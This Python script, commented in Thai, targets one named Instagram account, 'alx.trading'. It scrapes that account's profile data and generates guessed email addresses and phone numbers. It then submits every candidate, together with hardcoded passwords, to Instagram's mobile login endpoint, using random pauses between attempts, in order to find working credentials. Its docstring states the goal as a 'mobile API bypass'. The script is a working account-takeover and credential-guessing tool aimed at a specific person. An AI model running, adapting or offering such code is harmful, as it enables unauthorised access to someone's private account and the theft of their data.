#!/usr/bin/env python3
"""
Instagram Account Information Extractor
เครื่องมือสกัดข้อมูล account Instagram เพื่อหา email/phone ที่เชื่อมโยง

เป้าหมาย: หา email หรือ phone number ของ alx.trading 
เพื่อใช้ใน mobile API bypass
"""

import requests
import json
import time
import random
from datetime import datetime
import re

class InstagramAccountExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://www.instagram.com"
        
        # Headers สำหรับ web browsing
        self.web_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
    def extract_profile_info(self, username):
        """สกัดข้อมูลจาก profile page"""
        print(f"🔍 Extracting profile info for: {username}")
        
        try:
            # Method 1: Public profile page
            profile_url = f"{self.base_url}/{username}/"
            response = self.session.get(profile_url, headers=self.web_headers)
            
            print(f"📊 Profile page status: {response.status_code}")
            
            if response.status_code == 200:
                # ค้นหา JSON data ในหน้า
                json_matches = re.findall(r'window\._sharedData\s*=\s*(\{.*?\});', response.text)
                
                for i, json_text in enumerate(json_matches):
                    try:
                        data = json.loads(json_text)
                        print(f"🎯 Found JSON data block {i+1}")
                        
                        # ค้นหาข้อมูล user
                        user_data = self.extract_user_data(data)
                        if user_data:
                            return user_data
                            
                    except json.JSONDecodeError:
                        continue
                
                # Method 2: GraphQL endpoint
                return self.extract_via_graphql(username)
            
        except Exception as e:
            print(f"❌ Profile extraction error: {e}")
            return None
    
    def extract_user_data(self, data):
        """สกัดข้อมูล user จาก JSON data"""
        try:
            # หาข้อมูล user ในโครงสร้าง JSON
            if 'entry_data' in data:
                if 'ProfilePage' in data['entry_data']:
                    profile_data = data['entry_data']['ProfilePage'][0]['graphql']['user']
                    
                    user_info = {
                        'id': profile_data.get('id'),
                        'username': profile_data.get('username'),
                        'full_name': profile_data.get('full_name'),
                        'biography': profile_data.get('biography'),
                        'external_url': profile_data.get('external_url'),
                        'email': profile_data.get('business_email'),
                        'phone': profile_data.get('business_phone_number'),
                        'is_private': profile_data.get('is_private'),
                        'is_verified': profile_data.get('is_verified'),
                        'follower_count': profile_data.get('edge_followed_by', {}).get('count'),
                        'following_count': profile_data.get('edge_follow', {}).get('count')
                    }
                    
                    print(f"✅ Extracted user data: {user_info}")
                    return user_info
                    
        except Exception as e:
            print(f"❌ User data extraction error: {e}")
            
        return None
    
    def extract_via_graphql(self, username):
        """สกัดข้อมูลผ่าน GraphQL API"""
        print(f"🎯 Trying GraphQL extraction for: {username}")
        
        try:
            graphql_url = f"{self.base_url}/api/v1/users/web_profile_info/"
            
            headers = self.web_headers.copy()
            headers.update({
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': f'{self.base_url}/{username}/'
            })
            
            params = {'username': username}
            
            response = self.session.get(graphql_url, headers=headers, params=params)
            print(f"📊 GraphQL status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                
                if 'data' in data and 'user' in data['data']:
                    user_data = data['data']['user']
                    
                    user_info = {
                        'id': user_data.get('id'),
                        'username': user_data.get('username'),
                        'full_name': user_data.get('full_name'),
                        'biography': user_data.get('biography'),
                        'external_url': user_data.get('external_url'),
                        'email': user_data.get('business_email'),
                        'phone': user_data.get('business_phone_number'),
                        'is_private': user_data.get('is_private'),
                        'is_verified': user_data.get('is_verified')
                    }
                    
                    print(f"✅ GraphQL extracted data: {user_info}")
                    return user_info
                    
        except Exception as e:
            print(f"❌ GraphQL extraction error: {e}")
            
        return None
    
    def guess_email_patterns(self, username, full_name=None):
        """คาดเดา email patterns ที่เป็นไปได้"""
        print(f"📧 Guessing email patterns for: {username}")
        
        # แยกชื่อจาก full_name ถ้ามี
        name_parts = []
        if full_name:
            name_parts = full_name.lower().replace(' ', '').split()
        
        # Domain ที่น่าจะใช้
        domains = [
            'gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com',
            'icloud.com', 'protonmail.com', 'live.com', 'aol.com'
        ]
        
        # Pattern ที่เป็นไปได้
        patterns = [
            username,  # alx.trading
            username.replace('.', ''),  # alxtrading
            username.replace('.', '_'),  # alx_trading
        ]
        
        # เพิ่ม patterns จากชื่อ
        if name_parts:
            for part in name_parts:
                patterns.extend([
                    part,
                    f"{part}.{username}",
                    f"{username}.{part}"
                ])
        
        # สร้าง email combinations
        email_candidates = []
        for pattern in patterns:
            for domain in domains:
                email_candidates.append(f"{pattern}@{domain}")
        
        print(f"📧 Generated {len(email_candidates)} email candidates")
        return email_candidates[:20]  # จำกัดแค่ 20 ตัวแรก
    
    def guess_phone_patterns(self, username):
        """คาดเดา phone number patterns"""
        print(f"📱 Guessing phone patterns for: {username}")
        
        # ดึงตัวเลขจาก username
        numbers = re.findall(r'\d+', username)
        
        phone_candidates = []
        
        # Thailand patterns (+66)
        if numbers:
            for num in numbers:
                # เพิ่ม leading zeros
                padded_num = num.zfill(9)  # pad to 9 digits
                
                phone_candidates.extend([
                    f"+66{padded_num}",
                    f"66{padded_num}",
                    f"0{padded_num}",
                    f"+1{padded_num}",  # US
                    f"1{padded_num}",
                ])
        
        # Common Thai phone patterns
        thai_prefixes = ['08', '09', '06', '02']
        for prefix in thai_prefixes:
            if numbers:
                base_num = ''.join(numbers)
                if len(base_num) >= 7:
                    remaining = base_num[:7]
                    phone_candidates.append(f"+66{prefix}{remaining}")
        
        print(f"📱 Generated {len(phone_candidates)} phone candidates")
        return phone_candidates[:10]  # จำกัดแค่ 10 ตัวแรก
    
    def test_login_identifiers(self, identifiers, passwords):
        """ทดสอบ identifiers ต่างๆ กับ login API"""
        print(f"🎯 Testing {len(identifiers)} identifiers with login API")
        
        results = []
        
        for identifier in identifiers:
            print(f"\n📧 Testing identifier: {identifier}")
            
            for password in passwords[:2]:  # ทดสอบแค่ 2 รหัสผ่านแรก
                result = self.test_mobile_login(identifier, password)
                
                if result and result.get('json'):
                    response_data = result['json']
                    
                    # ตรวจสอบ response ที่น่าสนใจ
                    if 'invalid_user' not in response_data.get('error_type', ''):
                        print(f"🎉 INTERESTING RESPONSE for {identifier}: {response_data}")
                        results.append({
                            'identifier': identifier,
                            'password': password,
                            'response': response_data,
                            'status': 'interesting'
                        })
                
                # หน่วงเวลา
                time.sleep(random.uniform(1, 2))
        
        return results
    
    def test_mobile_login(self, identifier, password):
        """ทดสอบ mobile login API"""
        url = f"{self.base_url}/api/v1/accounts/login/"
        
        headers = {
            'User-Agent': 'Instagram 123.0.0.21.114 Android (25/7.1.1; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US; 185203708)',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
        }
        
        data = {
            'username': identifier,
            'password': password,
            'device_id': 'android-' + ''.join(random.choices('0123456789abcdef', k=16)),
            'login_attempt_count': '0'
        }
        
        try:
            response = self.session.post(url, data=data, headers=headers)
            
            result = {
                'identifier': identifier,
                'status_code': response.status_code,
                'text_length': len(response.text)
            }
            
            try:
                json_data = response.json()
                result['json'] = json_data
            except:
                result['json'] = None
            
            return result
            
        except Exception as e:
            print(f"❌ Mobile login test error: {e}")
            return None
    
    def run_comprehensive_extraction(self):
        """รันการสกัดข้อมูลครบถ้วน"""
        print("🚀 Starting Comprehensive Account Extraction")
        print("🎯 Target: alx.trading")
        print("=" * 60)
        
        username = "alx.trading"
        valid_passwords = ["Fleming654", "Fleming786", "Fleming1004"]
        
        # ขั้นตอนที่ 1: สกัดข้อมูล profile
        print("\n📋 Step 1: Profile Information Extraction")
        profile_info = self.extract_profile_info(username)
        
        # ขั้นตอนที่ 2: คาดเดา email patterns
        print("\n📋 Step 2: Email Pattern Generation")
        full_name = profile_info.get('full_name') if profile_info else None
        email_candidates = self.guess_email_patterns(username, full_name)
        
        # ขั้นตอนที่ 3: คาดเดา phone patterns
        print("\n📋 Step 3: Phone Pattern Generation")
        phone_candidates = self.guess_phone_patterns(username)
        
        # ขั้นตอนที่ 4: ทดสอบ identifiers
        print("\n📋 Step 4: Identifier Testing")
        all_identifiers = email_candidates + phone_candidates
        test_results = self.test_login_identifiers(all_identifiers, valid_passwords)
        
        # สรุปผลลัพธ์
        results = {
            'username': username,
            'profile_info': profile_info,
            'email_candidates': email_candidates,
            'phone_candidates': phone_candidates,
            'test_results': test_results,
            'timestamp': datetime.now().isoformat()
        }
        
        # บันทึกผลลัพธ์
        filename = f"account_extraction_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 Results saved to: {filename}")
        
        # สรุป
        print(f"\n📊 EXTRACTION SUMMARY")
        print("=" * 60)
        print(f"🔍 Profile extracted: {'Yes' if profile_info else 'No'}")
        print(f"📧 Email candidates: {len(email_candidates)}")
        print(f"📱 Phone candidates: {len(phone_candidates)}")
        print(f"🎯 Interesting responses: {len(test_results)}")
        
        return results

if __name__ == "__main__":
    extractor = InstagramAccountExtractor()
    results = extractor.run_comprehensive_extraction()
